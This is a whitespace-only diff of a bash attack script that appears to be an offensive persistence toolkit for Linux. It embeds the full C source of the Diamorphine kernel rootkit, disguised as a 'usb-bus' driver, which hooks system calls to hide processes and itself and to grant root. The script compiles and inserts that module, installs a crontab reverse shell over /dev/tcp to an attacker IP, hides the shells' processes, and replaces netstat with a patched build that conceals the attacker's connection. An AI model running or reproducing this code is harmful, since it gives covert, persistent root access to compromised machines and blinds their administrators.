@@ -37,7 +37,7 @@ obj-m := usb-bus.o
 KERNEL_DIR = /lib/modules/$(shell uname -r)/build
 PWD = $(shell pwd)
 all:
-	make -C $(KERNEL_DIR) SUBDIRS=$(PWD) modules
+  make -C $(KERNEL_DIR) SUBDIRS=$(PWD) modules
 EOF
 )
 
@@ -77,19 +77,19 @@ diamorphine=$(cat << \EOF
 #include <linux/slab.h>
 #include <linux/version.h>
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
-	#include <asm/uaccess.h>
+  #include <asm/uaccess.h>
 #endif
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
-	#include <linux/proc_ns.h>
+  #include <linux/proc_ns.h>
 #else
-	#include <linux/proc_fs.h>
+  #include <linux/proc_fs.h>
 #endif
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
-	#include <linux/file.h>
+  #include <linux/file.h>
 #else
-	#include <linux/fdtable.h>
+  #include <linux/fdtable.h>
 #endif
 
 struct linux_dirent {
@@ -107,18 +107,18 @@ int indexes = sizeof(MAGIC_PREFIX)/sizeof(MAGIC_PREFIX[0]);
 #define MODULE_NAME "diamorphine"
 
 enum {
-	SIGINVIS = 31,
-	SIGSUPER = 64,
-	SIGMODINVIS = 63,
+  SIGINVIS = 31,
+  SIGSUPER = 64,
+  SIGMODINVIS = 63,
 };
 
 int i;
 unsigned long cr0;
 static unsigned long *__sys_call_table;
 typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
-	unsigned int);
+  unsigned int);
 typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
-	struct linux_dirent64 *, unsigned int);
+  struct linux_dirent64 *, unsigned int);
 typedef asmlinkage int (*orig_kill_t)(pid_t, int);
 orig_getdents_t orig_getdents;
 orig_getdents64_t orig_getdents64;
@@ -127,189 +127,189 @@ orig_kill_t orig_kill;
 unsigned long *
 get_syscall_table_bf(void)
 {
-	unsigned long *syscall_table;
-	unsigned long int i;
+  unsigned long *syscall_table;
+  unsigned long int i;
 
-	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
-			i += sizeof(void *)) {
-		syscall_table = (unsigned long *)i;
+  for (i = (unsigned long int)sys_close; i < ULONG_MAX;
+      i += sizeof(void *)) {
+    syscall_table = (unsigned long *)i;
 
-		if (syscall_table[__NR_close] == (unsigned long)sys_close)
-			return syscall_table;
-	}
-	return NULL;
+    if (syscall_table[__NR_close] == (unsigned long)sys_close)
+      return syscall_table;
+  }
+  return NULL;
 }
 
 struct task_struct *
 find_task(pid_t pid)
 {
-	struct task_struct *p = current;
-	for_each_process(p) {
-		if (p->pid == pid)
-			return p;
-	}
-	return NULL;
+  struct task_struct *p = current;
+  for_each_process(p) {
+    if (p->pid == pid)
+      return p;
+  }
+  return NULL;
 }
 
 int
 is_invisible(pid_t pid)
 {
-	struct task_struct *task;
-	if (!pid)
-		return 0;
-	task = find_task(pid);
-	if (!task)
-		return 0;
-	if (task->flags & PF_INVISIBLE)
-		return 1;
-	return 0;
+  struct task_struct *task;
+  if (!pid)
+    return 0;
+  task = find_task(pid);
+  if (!task)
+    return 0;
+  if (task->flags & PF_INVISIBLE)
+    return 1;
+  return 0;
 }
 
 asmlinkage int
 hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
-	unsigned int count)
+  unsigned int count)
 {
-	int ret = orig_getdents64(fd, dirent, count), err;
-	unsigned short proc = 0;
-	unsigned long off = 0;
-	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
-	struct inode *d_inode;
+  int ret = orig_getdents64(fd, dirent, count), err;
+  unsigned short proc = 0;
+  unsigned long off = 0;
+  struct linux_dirent64 *dir, *kdirent, *prev = NULL;
+  struct inode *d_inode;
 
-	if (ret <= 0)
-		return ret;
+  if (ret <= 0)
+    return ret;
 
-	kdirent = kzalloc(ret, GFP_KERNEL);
-	if (kdirent == NULL)
-		return ret;
+  kdirent = kzalloc(ret, GFP_KERNEL);
+  if (kdirent == NULL)
+    return ret;
 
-	err = copy_from_user(kdirent, dirent, ret);
-	if (err)
-		goto out;
+  err = copy_from_user(kdirent, dirent, ret);
+  if (err)
+    goto out;
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
+  d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
 #else
-	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+  d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
 #endif
-	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
-		/*&& MINOR(d_inode->i_rdev) == 1*/)
-		proc = 1;
+  if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
+    /*&& MINOR(d_inode->i_rdev) == 1*/)
+    proc = 1;
 
-	while (off < ret) {
-		dir = (void *)kdirent + off;
-		for (i = 0; i < indexes; i++) {
-		if ((!proc &&
-		(memcmp(MAGIC_PREFIX[i], dir->d_name, strlen(MAGIC_PREFIX[i])) == 0))
-		|| (proc &&
-		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
-			if (dir == kdirent) {
-				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
-				continue;
-			}
-			prev->d_reclen += dir->d_reclen;
-		} else
-			if (i == indexes - 1) {
-			prev = dir;
-			}
-		}
-		off += dir->d_reclen;
-	}
-	err = copy_to_user(dirent, kdirent, ret);
-	if (err)
-		goto out;
+  while (off < ret) {
+    dir = (void *)kdirent + off;
+    for (i = 0; i < indexes; i++) {
+    if ((!proc &&
+    (memcmp(MAGIC_PREFIX[i], dir->d_name, strlen(MAGIC_PREFIX[i])) == 0))
+    || (proc &&
+    is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+      if (dir == kdirent) {
+        ret -= dir->d_reclen;
+        memmove(dir, (void *)dir + dir->d_reclen, ret);
+        continue;
+      }
+      prev->d_reclen += dir->d_reclen;
+    } else
+      if (i == indexes - 1) {
+      prev = dir;
+      }
+    }
+    off += dir->d_reclen;
+  }
+  err = copy_to_user(dirent, kdirent, ret);
+  if (err)
+    goto out;
 out:
-	kfree(kdirent);
-	return ret;
+  kfree(kdirent);
+  return ret;
 }
 
 asmlinkage int
 hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
-	unsigned int count)
+  unsigned int count)
 {
-	int ret = orig_getdents(fd, dirent, count), err;
-	unsigned short proc = 0;
-	unsigned long off = 0;
-	struct linux_dirent *dir, *kdirent, *prev = NULL;
-	struct inode *d_inode;
+  int ret = orig_getdents(fd, dirent, count), err;
+  unsigned short proc = 0;
+  unsigned long off = 0;
+  struct linux_dirent *dir, *kdirent, *prev = NULL;
+  struct inode *d_inode;
 
-	if (ret <= 0)
-		return ret;
+  if (ret <= 0)
+    return ret;
 
-	kdirent = kzalloc(ret, GFP_KERNEL);
-	if (kdirent == NULL)
-		return ret;
+  kdirent = kzalloc(ret, GFP_KERNEL);
+  if (kdirent == NULL)
+    return ret;
 
-	err = copy_from_user(kdirent, dirent, ret);
-	if (err)
-		goto out;
+  err = copy_from_user(kdirent, dirent, ret);
+  if (err)
+    goto out;
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
+  d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
 #else
-	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+  d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
 #endif
 
-	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
-		/*&& MINOR(d_inode->i_rdev) == 1*/)
-		proc = 1;
+  if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
+    /*&& MINOR(d_inode->i_rdev) == 1*/)
+    proc = 1;
 
-	while (off < ret) {
-		dir = (void *)kdirent + off;
-		for (i = 0; i < indexes; i++) {
-		if ((!proc &&
-		(memcmp(MAGIC_PREFIX[i], dir->d_name, strlen(MAGIC_PREFIX[i])) == 0))
-		|| (proc &&
-		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
-			if (dir == kdirent) {
-				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
-				continue;
-			}
-			prev->d_reclen += dir->d_reclen;
-		} else
-			if (i == indexes - 1) {
-			prev = dir;
-			}
-		}
-		off += dir->d_reclen;
-	}
-	err = copy_to_user(dirent, kdirent, ret);
-	if (err)
-		goto out;
+  while (off < ret) {
+    dir = (void *)kdirent + off;
+    for (i = 0; i < indexes; i++) {
+    if ((!proc &&
+    (memcmp(MAGIC_PREFIX[i], dir->d_name, strlen(MAGIC_PREFIX[i])) == 0))
+    || (proc &&
+    is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+      if (dir == kdirent) {
+        ret -= dir->d_reclen;
+        memmove(dir, (void *)dir + dir->d_reclen, ret);
+        continue;
+      }
+      prev->d_reclen += dir->d_reclen;
+    } else
+      if (i == indexes - 1) {
+      prev = dir;
+      }
+    }
+    off += dir->d_reclen;
+  }
+  err = copy_to_user(dirent, kdirent, ret);
+  if (err)
+    goto out;
 out:
-	kfree(kdirent);
-	return ret;
+  kfree(kdirent);
+  return ret;
 }
 
 void
 give_root(void)
 {
-	#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
-		current->uid = current->gid = 0;
-		current->euid = current->egid = 0;
-		current->suid = current->sgid = 0;
-		current->fsuid = current->fsgid = 0;
-	#else
-		struct cred *newcreds;
-		newcreds = prepare_creds();
-		if (newcreds == NULL)
-			return;
-		#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
-			&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
-			|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
-			newcreds->uid.val = newcreds->gid.val = 0;
-			newcreds->euid.val = newcreds->egid.val = 0;
-			newcreds->suid.val = newcreds->sgid.val = 0;
-			newcreds->fsuid.val = newcreds->fsgid.val = 0;
-		#else
-			newcreds->uid = newcreds->gid = 0;
-			newcreds->euid = newcreds->egid = 0;
-			newcreds->suid = newcreds->sgid = 0;
-			newcreds->fsuid = newcreds->fsgid = 0;
-		#endif
-		commit_creds(newcreds);
-	#endif
+  #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
+    current->uid = current->gid = 0;
+    current->euid = current->egid = 0;
+    current->suid = current->sgid = 0;
+    current->fsuid = current->fsgid = 0;
+  #else
+    struct cred *newcreds;
+    newcreds = prepare_creds();
+    if (newcreds == NULL)
+      return;
+    #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
+      && defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
+      || LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
+      newcreds->uid.val = newcreds->gid.val = 0;
+      newcreds->euid.val = newcreds->egid.val = 0;
+      newcreds->suid.val = newcreds->sgid.val = 0;
+      newcreds->fsuid.val = newcreds->fsgid.val = 0;
+    #else
+      newcreds->uid = newcreds->gid = 0;
+      newcreds->euid = newcreds->egid = 0;
+      newcreds->suid = newcreds->sgid = 0;
+      newcreds->fsuid = newcreds->fsgid = 0;
+    #endif
+    commit_creds(newcreds);
+  #endif
 }
 
 static inline void
@@ -317,8 +317,8 @@ tidy(void)
 {
 //	kfree(THIS_MODULE->notes_attrs);
 //	THIS_MODULE->notes_attrs = NULL;
-	kfree(THIS_MODULE->sect_attrs);
-	THIS_MODULE->sect_attrs = NULL;
+  kfree(THIS_MODULE->sect_attrs);
+  THIS_MODULE->sect_attrs = NULL;
 //	kfree(THIS_MODULE->mkobj.mp);
 //	THIS_MODULE->mkobj.mp = NULL;
 //	THIS_MODULE->modinfo_attrs->attr.name = NULL;
@@ -332,93 +332,93 @@ static short module_hidden = 0;
 void
 module_show(void)
 {
-	list_add(&THIS_MODULE->list, module_previous);
-	//kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent,
-	//			MODULE_NAME);
-	module_hidden = 0;
+  list_add(&THIS_MODULE->list, module_previous);
+  //kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent,
+  //			MODULE_NAME);
+  module_hidden = 0;
 }
 
 
 void
 module_hide(void)
 {
-	module_previous = THIS_MODULE->list.prev;
-	list_del(&THIS_MODULE->list);
-	kobject_del(&THIS_MODULE->mkobj.kobj);
-	//list_del(&THIS_MODULE->mkobj.kobj.entry);
-	module_hidden = 1;
+  module_previous = THIS_MODULE->list.prev;
+  list_del(&THIS_MODULE->list);
+  kobject_del(&THIS_MODULE->mkobj.kobj);
+  //list_del(&THIS_MODULE->mkobj.kobj.entry);
+  module_hidden = 1;
 }
 
 asmlinkage int
 hacked_kill(pid_t pid, int sig)
 {
-	struct task_struct *task;
+  struct task_struct *task;
 
-	switch (sig) {
-		case SIGINVIS:
-			if ((task = find_task(pid)) == NULL)
-				return -ESRCH;
-			task->flags = PF_INVISIBLE;
-			//task->flags ^= PF_INVISIBLE;
-			break;
-		case SIGSUPER:
-			give_root();
-			break;
-		case SIGMODINVIS:
-			if (module_hidden) module_show();
-			else module_hide();
-			break;
-		default:
-			return orig_kill(pid, sig);
-	}
-	return 0;
+  switch (sig) {
+    case SIGINVIS:
+      if ((task = find_task(pid)) == NULL)
+        return -ESRCH;
+      task->flags = PF_INVISIBLE;
+      //task->flags ^= PF_INVISIBLE;
+      break;
+    case SIGSUPER:
+      give_root();
+      break;
+    case SIGMODINVIS:
+      if (module_hidden) module_show();
+      else module_hide();
+      break;
+    default:
+      return orig_kill(pid, sig);
+  }
+  return 0;
 }
 
 static inline void
 protect_memory(void)
 {
-	write_cr0(cr0);
+  write_cr0(cr0);
 }
 
 static inline void
 unprotect_memory(void)
 {
-	write_cr0(cr0 & ~0x00010000);
+  write_cr0(cr0 & ~0x00010000);
 }
 
 static int __init
 diamorphine_init(void)
 {
-	__sys_call_table = get_syscall_table_bf();
-	if (!__sys_call_table)
-		return -1;
+  __sys_call_table = get_syscall_table_bf();
+  if (!__sys_call_table)
+    return -1;
 
-	cr0 = read_cr0();
+  cr0 = read_cr0();
 
-	module_hide();
-	tidy();
+  module_hide();
+  tidy();
 
-	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
-	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
-	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
+  orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
+  orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
+  orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
 
-	unprotect_memory();
-	__sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
-	__sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
-	__sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
-	protect_memory();
+  unprotect_memory();
+  __sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
+  __sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
+  __sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
+  protect_memory();
 
-	return 0;
+  return 0;
 }
 
 static void __exit
 diamorphine_cleanup(void)
 {
-	unprotect_memory();
-	__sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
-	__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
-	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
-	protect_memory();
+  unprotect_memory();
+  __sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
+  __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
+  __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
+  protect_memory();
 }
 
 module_init(diamorphine_init);
@@ -525,34 +525,34 @@ while true; do
 #hide usb-bus and d-bus, which are the scripts that the systemd services execute
 bash_pid=$(ps aux | awk '{ if($11 ~ /bash/) print $2 }')
 while read hide_pid; do
-	cmdline=$(cat /proc/$hide_pid/cmdline)
-	cat /proc/$hide_pid/cmdline &>/dev/null
-	if [ "$?" == "1" ]; then
-		continue
-	fi
-	if [ "$cmdline" == "/bin/bash/var/lib/usb-bus/usb-bus" ] || [ "$cmdline" == "/bin/bash/usr/local/share/d-bus/d-bus" ]; then
-		kill -31 $hide_pid
-		#echo "hid systemd service pid: $hide_pid"
-	fi
+  cmdline=$(cat /proc/$hide_pid/cmdline)
+  cat /proc/$hide_pid/cmdline &>/dev/null
+  if [ "$?" == "1" ]; then
+    continue
+  fi
+  if [ "$cmdline" == "/bin/bash/var/lib/usb-bus/usb-bus" ] || [ "$cmdline" == "/bin/bash/usr/local/share/d-bus/d-bus" ]; then
+    kill -31 $hide_pid
+    #echo "hid systemd service pid: $hide_pid"
+  fi
 done <<<$bash_pid
 
 #hide bash shells which our systemd service spawns
 inode_list=$(cat /proc/net/tcp | awk '{ if($3 ~ /0150A8C0:270F/) print $10 }')
 for (( i=1; i <= 65553; i=i+1 )); do
-	if [ "${hidden_pids[i]}" != "" ]; then
-		#echo "$i already on hidden_pids"
-		continue
-	fi
-	socket=$(readlink /proc/$i/fd/0)
-	while read inode_number; do
-		if [ "socket:[$inode_number]" == "$socket" ]; then
-			#echo "pid: $i inode_number: $inode_number"
-			kill -31 $i
-			#echo "hid bash pid: $i"
-			hidden_pids[i]=$i
-			#echo "hidden_pids[i] pid: ${hidden_pids[i]}"
-		fi
-	done <<<$inode_list
+  if [ "${hidden_pids[i]}" != "" ]; then
+    #echo "$i already on hidden_pids"
+    continue
+  fi
+  socket=$(readlink /proc/$i/fd/0)
+  while read inode_number; do
+    if [ "socket:[$inode_number]" == "$socket" ]; then
+      #echo "pid: $i inode_number: $inode_number"
+      kill -31 $i
+      #echo "hid bash pid: $i"
+      hidden_pids[i]=$i
+      #echo "hidden_pids[i] pid: ${hidden_pids[i]}"
+    fi
+  done <<<$inode_list
 done
 
 #sleep 10
@@ -664,26 +664,26 @@ echo "user making the connection: $USER"
 #if the user making the connection is not root add a crontab entry which spawns backdoor bash shells
 if [ "$USER" != "root" ]; then
   printf "adding crontab for $USER... "
-	printf "* * * * * bash -c 'bash &>/dev/tcp/$ip 0>&1 &'\n" > /tmp/.cron
-	crontab /tmp/.cron
+  printf "* * * * * bash -c 'bash &>/dev/tcp/$ip 0>&1 &'\n" > /tmp/.cron
+  crontab /tmp/.cron
   finish
-	rm /tmp/.cron
-	#exit to tell ncat that we are done with the script so the connection closes
-	exit
+  rm /tmp/.cron
+  #exit to tell ncat that we are done with the script so the connection closes
+  exit
 fi
 #if the user making the connection is root do the following:
 if [ "$USER" == "root" ]; then
-	#users=$(cat /etc/passwd | awk -F: '{ print $1 }')
-	#read -d + -a usernames <<< "$users"
-	#for (( i=0; i < ${#usernames[@]}; i=i+1 )); do
-	#	cron=$(crontab -u ${usernames[i]} -l 2>/dev/null)
-	#	if [ "$cron" == "* * * * * bash -c 'bash &>/dev/tcp/$ip 0>&1'" ]; then
-	#		crontab -u ${usernames[i]} -r
-	#		echo "removing ${usernames[i]} crontab"
-	#	fi
-	#done
+  #users=$(cat /etc/passwd | awk -F: '{ print $1 }')
+  #read -d + -a usernames <<< "$users"
+  #for (( i=0; i < ${#usernames[@]}; i=i+1 )); do
+  #	cron=$(crontab -u ${usernames[i]} -l 2>/dev/null)
+  #	if [ "$cron" == "* * * * * bash -c 'bash &>/dev/tcp/$ip 0>&1'" ]; then
+  #		crontab -u ${usernames[i]} -r
+  #		echo "removing ${usernames[i]} crontab"
+  #	fi
+  #done
 
-	#--create the systemd scripts and services--
+  #--create the systemd scripts and services--
   echo "--create the systemd scripts and services--"
   mkdir /var/lib/usb-bus 2>/dev/null
   create_script "$hiding_script" "/var/lib/usb-bus/usb-bus"
@@ -705,121 +705,121 @@ if [ "$USER" == "root" ]; then
     fi
   done
 
-	#--make and insert the usb-bus rootkit module--
+  #--make and insert the usb-bus rootkit module--
   echo "--install the rootkit--"
-	#make the usb-bus rootkit module
-	if [ ! -d "/lib/modules/$(uname -r)/kernel/drivers/usb-bus" ]; then
-		mkdir /lib/modules/$(uname -r)/kernel/drivers/usb-bus
-	fi
-	printf "$diamorphine_makefile" >/lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile
-	printf "$diamorphine" >/lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.c
-	printf "make usb-bus rootkit module... "
-	make -C /lib/modules/$(uname -r)/kernel/drivers/usb-bus &>/dev/null
-	if [ "$?" == "0" ]; then
-		echo "done"
-	else
+  #make the usb-bus rootkit module
+  if [ ! -d "/lib/modules/$(uname -r)/kernel/drivers/usb-bus" ]; then
+    mkdir /lib/modules/$(uname -r)/kernel/drivers/usb-bus
+  fi
+  printf "$diamorphine_makefile" >/lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile
+  printf "$diamorphine" >/lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.c
+  printf "make usb-bus rootkit module... "
+  make -C /lib/modules/$(uname -r)/kernel/drivers/usb-bus &>/dev/null
+  if [ "$?" == "0" ]; then
+    echo "done"
+  else
     echo "failed, trying some fixes"
     #if make is unsuccessful get the headers needed for the module to work, patch the kernel makefile and make again
-		#copy the headers
-		if [ ! -d "/usr/src/linux-headers-$(uname -r)/include/asm" ] || [ ! -L "/usr/src/linux-headers-$(uname -r)/include/asm" ]; then
-			cp -r -L /usr/src/linux-headers-$(uname -r)/arch/x86/include/asm /usr/src/linux-headers-$(uname -r)/include
-			if [ "$?" == "1" ]; then
-				cp -r /usr/src/linux-headers-$(uname -r)/arch/x86/include/asm /usr/src/linux-headers-$(uname -r)/include
-			fi
-		fi
-		if [ ! -d "/usr/src/linux-headers-$(uname -r)/include/uapi/asm" ]; then
-			cp -r /usr/src/linux-headers-$(uname -r)/arch/x86/include/uapi/asm /usr/src/linux-headers-$(uname -r)/include/uapi
-		fi
-		gcc --version | grep "7\." &>/dev/null
-		if [ "$?" == "0" ]; then
-			if [ ! -e "/usr/src/linux-headers-$(uname -r)/include/stdarg.h" ]; then
-				cp /usr/lib/gcc/x86_64-linux-gnu/7/include/stdarg.h /usr/src/linux-headers-$(uname -r)/include/stdarg.h
-			fi
-		else
-			gcc --version | grep "8\." &>/dev/null
-			if [ "$?" == "0" ]; then
-				if [ ! -e "/usr/src/linux-headers-$(uname -r)/include/stdarg.h" ]; then
-					cp /usr/lib/gcc/x86_64-linux-gnu/8/include/stdarg.h /usr/src/linux-headers-$(uname -r)/include/stdarg.h
-				fi
-			fi
-		fi
+    #copy the headers
+    if [ ! -d "/usr/src/linux-headers-$(uname -r)/include/asm" ] || [ ! -L "/usr/src/linux-headers-$(uname -r)/include/asm" ]; then
+      cp -r -L /usr/src/linux-headers-$(uname -r)/arch/x86/include/asm /usr/src/linux-headers-$(uname -r)/include
+      if [ "$?" == "1" ]; then
+        cp -r /usr/src/linux-headers-$(uname -r)/arch/x86/include/asm /usr/src/linux-headers-$(uname -r)/include
+      fi
+    fi
+    if [ ! -d "/usr/src/linux-headers-$(uname -r)/include/uapi/asm" ]; then
+      cp -r /usr/src/linux-headers-$(uname -r)/arch/x86/include/uapi/asm /usr/src/linux-headers-$(uname -r)/include/uapi
+    fi
+    gcc --version | grep "7\." &>/dev/null
+    if [ "$?" == "0" ]; then
+      if [ ! -e "/usr/src/linux-headers-$(uname -r)/include/stdarg.h" ]; then
+        cp /usr/lib/gcc/x86_64-linux-gnu/7/include/stdarg.h /usr/src/linux-headers-$(uname -r)/include/stdarg.h
+      fi
+    else
+      gcc --version | grep "8\." &>/dev/null
+      if [ "$?" == "0" ]; then
+        if [ ! -e "/usr/src/linux-headers-$(uname -r)/include/stdarg.h" ]; then
+          cp /usr/lib/gcc/x86_64-linux-gnu/8/include/stdarg.h /usr/src/linux-headers-$(uname -r)/include/stdarg.h
+        fi
+      fi
+    fi
     #patch the kernel makefile
-		location1=$(readlink -m /usr/src/linux-headers-$(uname -r)/Makefile)
-		location=$(echo "$location1" | awk -F/ '{ print $2"/"$3"/"$4 }')
-		printf "$kernel_makefile" >/$location/mkfile.patch
+    location1=$(readlink -m /usr/src/linux-headers-$(uname -r)/Makefile)
+    location=$(echo "$location1" | awk -F/ '{ print $2"/"$3"/"$4 }')
+    printf "$kernel_makefile" >/$location/mkfile.patch
     printf "patch the makefile... "
-		patch -b -d /$location </$location/mkfile.patch &>/dev/null
+    patch -b -d /$location </$location/mkfile.patch &>/dev/null
     finish
-		rm /$location/mkfile.patch
+    rm /$location/mkfile.patch
     #make the usb-bus module
-		printf "make the usb-bus rootkit module... "
-		make -C /lib/modules/$(uname -r)/kernel/drivers/usb-bus &>/dev/null
+    printf "make the usb-bus rootkit module... "
+    make -C /lib/modules/$(uname -r)/kernel/drivers/usb-bus &>/dev/null
     finish
-		rm /$location/Makefile
-		mv /$location/Makefile.* /$location/Makefile
-	fi
+    rm /$location/Makefile
+    mv /$location/Makefile.* /$location/Makefile
+  fi
 
-	#make module auto-load after every reboot (dangerous, the computer might start having problems at boot)
-	#printf "usb-bus" >/usr/lib/modules-load.d/usb-bus.conf
-	#depmod -a #take care of dependencies otherwise you will have problems booting
+  #make module auto-load after every reboot (dangerous, the computer might start having problems at boot)
+  #printf "usb-bus" >/usr/lib/modules-load.d/usb-bus.conf
+  #depmod -a #take care of dependencies otherwise you will have problems booting
 
-	#remove what is not needed after the make
-	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.c &>/dev/null
-	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.o &>/dev/null
-	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile &>/dev/null
-	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Module* &>/dev/null
-	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/modules* &>/dev/null
-	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*safe &>/dev/null
+  #remove what is not needed after the make
+  rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.c &>/dev/null
+  rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.o &>/dev/null
+  rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile &>/dev/null
+  rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Module* &>/dev/null
+  rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/modules* &>/dev/null
+  rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*safe &>/dev/null
   #insert the usb-bus module
   printf "inserting the usb-bus module... "
-	insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko &>/dev/null
+  insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko &>/dev/null
   finish
 
-	#---replace netstat---
+  #---replace netstat---
   which netstat &>/dev/null
   if [ "$?" == "0" ]; then
     echo "---replace netstat---"
-  	rm /tmp/net-tools.zip &>/dev/null
-  	rm  -r /tmp/net-tools-master &>/dev/null
+    rm /tmp/net-tools.zip &>/dev/null
+    rm  -r /tmp/net-tools-master &>/dev/null
     #download net-tools.zip
-  	printf "download net-tools.zip... "
-  	wget -O /tmp/net-tools.zip https://github.com/ecki/net-tools/archive/master.zip &>/dev/null
+    printf "download net-tools.zip... "
+    wget -O /tmp/net-tools.zip https://github.com/ecki/net-tools/archive/master.zip &>/dev/null
     finish
     #unzip net-tools.zip
     printf "unzipping net-tools.zip... "
-  	unzip -d /tmp /tmp/net-tools.zip >/dev/null
+    unzip -d /tmp /tmp/net-tools.zip >/dev/null
     finish
-  	rm /tmp/net-tools.zip
-   	#modify netstat.c
+    rm /tmp/net-tools.zip
+     #modify netstat.c
     printf "modifying netstat.c... "
-  	sed -i "s/printf(\"%-4s\s\s%6ld\s%6ld\s%-\*s/if ( strstr(rem_addr, \"$ip:$port\") == 0 ) {\n\t\tprintf(\"%-4s  %6ld %6ld %-*s/" /tmp/net-tools-master/netstat.c
-  	sed -i '0,/finish_this_one(uid,inode,timers);/{s/finish_this_one(uid,inode,timers);/\tfinish_this_one(uid,inode,timers);\n\t}/};' /tmp/net-tools-master/netstat.c
+    sed -i "s/printf(\"%-4s\s\s%6ld\s%6ld\s%-\*s/if ( strstr(rem_addr, \"$ip:$port\") == 0 ) {\n\t\tprintf(\"%-4s  %6ld %6ld %-*s/" /tmp/net-tools-master/netstat.c
+    sed -i '0,/finish_this_one(uid,inode,timers);/{s/finish_this_one(uid,inode,timers);/\tfinish_this_one(uid,inode,timers);\n\t}/};' /tmp/net-tools-master/netstat.c
     finish
     #patch the makefile
     #printf "patching the net-tools makefile... "
-  	printf "$net_tools_patch" >/tmp/net-tools-master/net.patch
-  	patch -d /tmp/net-tools-master/ </tmp/net-tools-master/net.patch &>/dev/null
+    printf "$net_tools_patch" >/tmp/net-tools-master/net.patch
+    patch -d /tmp/net-tools-master/ </tmp/net-tools-master/net.patch &>/dev/null
     #finish
     #make config net-tools-master
     printf "make config net-tools-master... "
-  	yes "" 2>/dev/null | make -C /tmp/net-tools-master config &>/dev/null
+    yes "" 2>/dev/null | make -C /tmp/net-tools-master config &>/dev/null
     finish
     #make net-tools-master
     printf "make net-tools-master... "
-  	make -C /tmp/net-tools-master &>/dev/null
+    make -C /tmp/net-tools-master &>/dev/null
     finish
     #make update net-tools-master, so netstat gets replaced
     printf "make update net-tools-master... "
-  	make update -C /tmp/net-tools-master &>/dev/null
-  	if [ "$?" == "0" ]; then
-  		echo "done, netstat replaced"
-  	else
-  		echo "failed, netstat not replaced"
-  	fi
-  	rm  -r /tmp/net-tools-master
